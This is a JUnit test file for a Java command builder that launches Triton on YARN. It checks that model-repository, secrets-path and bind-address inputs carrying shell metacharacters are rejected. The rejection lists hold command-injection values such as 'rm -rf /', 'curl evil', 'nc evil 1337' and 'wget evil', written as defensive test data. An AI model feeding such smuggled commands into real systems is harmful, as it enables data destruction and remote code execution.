package varga.tarn.yarn;

/*-
 * #%L
 * Tarn
 * %%
 * Copyright (C) 2025 - 2026 Varga Foundation
 * %%
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 * #L%
 */

import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;

import static org.junit.jupiter.api.Assertions.*;

/**
 * Ensures that paths passed to the Triton launch command builder cannot smuggle shell
 * metacharacters. These inputs end up in a shell command executed by YARN on NodeManagers,
 * so any loosening here is a remote-code-execution vulnerability.
 */
public class TritonCommandBuilderTest {

    @ParameterizedTest
    @ValueSource(strings = {
            "hdfs:///user/models",
            "hdfs://namenode:8020/user/models",
            "/mnt/hdfs/models",
            "/models",
            "hdfs:///a/b/c-d_e.ext",
    })
    public void acceptsSafePaths(String path) {
        assertDoesNotThrow(() -> new TritonCommandBuilder().modelRepository(path));
        assertDoesNotThrow(() -> new TritonCommandBuilder().secretsPath(path));
    }

    @ParameterizedTest
    @ValueSource(strings = {
            "hdfs:///a ; rm -rf /",
            "hdfs:///a`curl evil`",
            "hdfs:///a$(whoami)",
            "hdfs:///a|nc evil 1337",
            "hdfs:///a && wget evil",
            "hdfs:///a\nrm",
            "hdfs:///a'",
            "hdfs:///a\"",
            "hdfs:///a\\b",
            "hdfs:///a<redirect",
            "hdfs:///a>redirect",
            "hdfs:///a?glob",
            "hdfs:///a*glob",
            "relative/path",
            "../escape",
            "",  // empty passes via return-early, but this is documented behaviour
    })
    public void rejectsUnsafeOrNonAbsolutePaths(String path) {
        if (path.isEmpty()) {
            // Empty is accepted (treated as "no repository"); skip assertion.
            return;
        }
        assertThrows(IllegalArgumentException.class,
                () -> new TritonCommandBuilder().modelRepository(path),
                "modelRepository should reject: " + path);
        assertThrows(IllegalArgumentException.class,
                () -> new TritonCommandBuilder().secretsPath(path),
                "secretsPath should reject: " + path);
    }

    @Test
    public void buildIncludesHdfsCopyForHdfsRepository() {
        String cmd = new TritonCommandBuilder()
                .modelRepository("hdfs:///user/models")
                .httpPort(8000)
                .grpcPort(8001)
                .metricsPort(8002)
                .build();
        assertTrue(cmd.contains("hadoop fs -copyToLocal hdfs:///user/models/* /models"));
        assertTrue(cmd.contains("--model-repository=/models"));
    }

    @Test
    public void buildUsesLocalPathDirectlyForNfsMount() {
        String cmd = new TritonCommandBuilder()
                .modelRepository("/mnt/nfs/models")
                .build();
        assertFalse(cmd.contains("hadoop fs -copyToLocal"));
        assertTrue(cmd.contains("--model-repository=/mnt/nfs/models"));
    }

    @Test
    public void rejectsUnsafeBindAddress() {
        assertThrows(IllegalArgumentException.class,
                () -> new TritonCommandBuilder().bindAddress("0.0.0.0; rm -rf /"));
        assertThrows(IllegalArgumentException.class,
                () -> new TritonCommandBuilder().bindAddress("host name"));
    }
}
